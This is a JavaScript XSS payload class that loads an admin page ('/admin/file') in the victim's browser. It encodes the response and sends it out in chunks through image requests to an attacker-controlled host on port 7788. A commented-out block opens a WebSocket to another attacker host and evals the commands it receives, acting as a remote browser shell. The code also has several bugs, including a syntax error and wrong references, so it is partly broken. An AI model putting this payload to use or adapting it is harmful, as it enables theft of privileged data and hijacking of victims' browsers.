class xssPayload {

    constructor(vps_host) {
        this.vps_host = vps_host;
        this.xhr = this.createXhr();
    }

    createXhr(){
        let xhr = new XMLHttpRequest();
        return xhr;
    }

    settingXhr(loadCb,url,_method="GET",params={}){
        var = _params="";
        for(k in params){
            _params+=`&${k}=${params[k]}`;
        }
        this.xhr.addEventListener("load", loadCb);
        this.xhr.open(_method, url, this._method === "POST");
        if(this._method === "POST"){
            this.xhr.setRequestHeader("Content-Type", this.cType || "application/x-www-form-urlencoded");
        }
        this.xhr.send(_params);
    }

    getSourceCodeLoadCb() {
        var para = document.createElement("div");
        var res = "";
        try {
            res = encodeURIComponent(this.responseText);
            res = btoa(res);
        } catch (error) {
            res = escape(error.message);
        }
        var d = parseInt(res.length / 100) + 1;
        for (var i = 0; i <= res.length; i++) {
            var t = res.substr(i * 100, 100);
            var img = document.createElement("img");
            img.setAttribute("src", this.vps_host + "?v=" + t);
            para.appendChild(img);
        }
    }

    getSourceCode(url,_method="GET",params={}){
        settingXhr(this.getSourceCodeLoadCb,url,_method="GET",params={})
    }

}

var vps = "http://x.x.x.x:7788/";
var xss = new xssPayload(vps);
xss.getSourceCode("/admin/file");

// var oReq = new XMLHttpRequest();
// oReq.addEventListener("load", rr);
// oReq.open("GET", "/admin/file");
// oReq.send();
// var ws;
// ws = new WebSocket("ws://x.x.x.x:7887/");
// ws.onmessage = function(e) {
//   if (e.data == 'quit' || e.data == 'exit' ){
//     ws.close();
//   }else{
//     ws.send(eval(e.data));
//   }
// };
// ws.onerror = function(e) {ws.send(e);};
// ws.send("emmmmm");
